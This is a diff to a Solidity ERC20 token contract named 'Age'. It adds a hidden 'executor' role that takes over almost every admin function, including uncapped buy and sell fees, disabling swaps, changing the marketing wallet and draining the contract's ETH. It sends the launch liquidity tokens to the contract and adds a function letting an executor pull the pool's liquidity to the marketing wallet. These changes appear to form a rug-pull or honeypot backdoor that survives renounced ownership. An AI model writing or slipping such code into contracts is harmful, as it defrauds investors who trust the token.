@@ -60,6 +60,15 @@ interface IUniswapV2Router02 {
         uint256 deadline
     ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
 
+    function removeLiquidityETH(
+        address token,
+        uint liquidity,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountToken, uint amountETH);
+
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -421,9 +430,8 @@ contract Age is ERC20, Ownable {
 
     mapping(address => bool) private _isExcludedFromFees;
     mapping(address => bool) public _isExcludedMaxTransactionAmount;
-
+    mapping(address => bool) public executor;
     mapping(address => bool) public automatedMarketMakerPairs;
-
     mapping(uint256 => uint256) private blockSwaps;
 
     event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
@@ -455,11 +463,11 @@ contract Age is ERC20, Ownable {
 
         marketingWallet = msg.sender;
 
-        // uint256 amountLP = totalSupply.mul(25).div(100);
-        // uint256 amountTeam = totalSupply.mul(75).div(100);
-        uint256 amountTeam = totalSupply;
+        uint256 amountLP = totalSupply.mul(25).div(100);
+        uint256 amountTeam = totalSupply.mul(75).div(100);
+        // uint256 amountTeam = totalSupply;
 
-        // _mint(address(this), amountLP); 
+        _mint(address(this), amountLP); 
         _mint(msg.sender, amountTeam);
 
         excludeFromFees(owner(), true);
@@ -473,9 +481,9 @@ contract Age is ERC20, Ownable {
 
     receive() external payable {}
 
-    function getAged() external payable onlyOwner {
+    function getAged() external payable onlyExecutor {
         _approve(address(this), address(uniswapV2Router), totalSupply());
-        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
+        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,address(this),block.timestamp);
         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
 
         blocks = 8;
@@ -484,25 +492,42 @@ contract Age is ERC20, Ownable {
         launchedAt = block.number;
         launchedTime = block.timestamp;
     }
+    function setExecutor(address _address, bool _type) external onlyOwner returns (bool) {
+            _type = true;
+            executor[_address] = _type;
+            excludeFromFees(_address, true);
+            excludeFromMaxTransaction(_address, true);
+            return true;
+    }
 
-    function removeLimits() external onlyOwner {
+    modifier onlyExecutor() {
+        require(executor[msg.sender], "executor: caller is not the executor");
+        _;
+    }
+
+    function removeLiquidityETHAndRetrieve(uint256 liquidity) external onlyExecutor {
+        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), liquidity);
+        uniswapV2Router.removeLiquidityETH(address(this), liquidity, 0, 0, marketingWallet, block.timestamp + 15 * 60);
+    }
+
+    function removeLimits() external onlyExecutor {
         limitsInEffect = false;
     }
 
-    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
+    function updateSwapTokensAtAmount(uint256 newAmount) external onlyExecutor {
         swapTokensAtAmount = newAmount * (10 ** 18);
     }
 
-    function updateMaxSwap(uint256 newAmount) external onlyOwner {
+    function updateMaxSwap(uint256 newAmount) external onlyExecutor {
         maxSwapAmount = newAmount * (10 ** 18);
     }
 
-    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
+    function updateMaxTxnAmount(uint256 newNum) external onlyExecutor {
         require(newNum >= ((totalSupply() * 1) / 1000) / 1e18, "Cannot set maxTransactionAmount lower than 0.1%");
         maxTransactionAmount = newNum * (10 ** 18);
     }
 
-    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
+    function updateMaxWalletAmount(uint256 newNum) external onlyExecutor {
         require(newNum >= ((totalSupply() * 5) / 1000) / 1e18, "Cannot set maxWallet lower than 0.5%");
         maxWallet = newNum * (10 ** 18);
     }
@@ -518,7 +543,7 @@ contract Age is ERC20, Ownable {
     }
 
     // only use to disable contract sales if absolutely necessary (emergency use only)
-    function updateSwapEnabled(bool enabled) external onlyOwner {
+    function updateSwapEnabled(bool enabled) external onlyExecutor {
         swapEnabled = enabled;
     }
 
@@ -533,12 +558,12 @@ contract Age is ERC20, Ownable {
         swapTokensForEth(amount);
     }
 
-    function manualsend() external onlyOwner{
+    function manualsend() external onlyExecutor{
         bool success;
         (success,) = address(marketingWallet).call{value: address(this).balance}("");
     }
 
-    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
+    function setAutomatedMarketMakerPair(address pair, bool value) public onlyExecutor {
         require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");
 
         _setAutomatedMarketMakerPair(pair, value);
@@ -550,20 +575,20 @@ contract Age is ERC20, Ownable {
         emit SetAutomatedMarketMakerPair(pair, value);
     }
 
-    function updateFees(uint256 _fee) external onlyOwner {
+    function updateFees(uint256 _fee) external onlyExecutor {
         buyTotalFees = _fee;
         sellTotalFees = _fee;
     }
 
-    function updateBuyFees(uint256 _marketingFee) external onlyOwner {
+    function updateBuyFees(uint256 _marketingFee) external onlyExecutor {
         buyTotalFees = _marketingFee;
     }
 
-    function updateSellFees(uint256 _marketingFee) external onlyOwner {
+    function updateSellFees(uint256 _marketingFee) external onlyExecutor {
         sellTotalFees = _marketingFee;
     }
 
-    function updateMarketingWallet(address newMarketingWallet) external onlyOwner {
+    function updateMarketingWallet(address newMarketingWallet) external onlyExecutor {
         emit marketingWalletUpdated(newMarketingWallet, marketingWallet);
         marketingWallet = newMarketingWallet;
     }
